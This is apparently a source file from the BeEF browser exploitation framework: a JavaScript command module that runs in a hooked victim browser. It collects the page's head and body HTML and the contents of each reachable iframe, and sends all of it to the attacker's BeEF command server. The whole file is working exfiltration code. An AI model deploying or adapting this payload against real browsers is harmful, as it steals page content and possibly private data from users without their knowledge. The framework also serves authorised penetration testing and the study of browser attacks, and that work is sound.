//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	try {
		var html_head = document.head.innerHTML.toString();
	} catch (e) {
		var html_head = "Error: document has no head";
	}
	try {
		var html_body = document.body.innerHTML.toString();
	} catch (e) {
		var html_body = "Error: document has no body";
	}
        try {	
		var iframes = document.getElementsByTagName('iframe');
		for(var i=0; i<iframes.length; i++){
			beef.net.send("<%= @command_url %>", <%= @command_id %>, 'iframe'+i+'='+iframes[i].contentWindow.document.body.innerHTML);
		}
		var iframe_ = "Info: iframe(s) found";
	} catch (e) {
		var iframe_ = "Error: document has no iframe or policy issue";
	}

	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'head='+html_head+'&body='+html_body+'&iframe_='+iframe_);

});

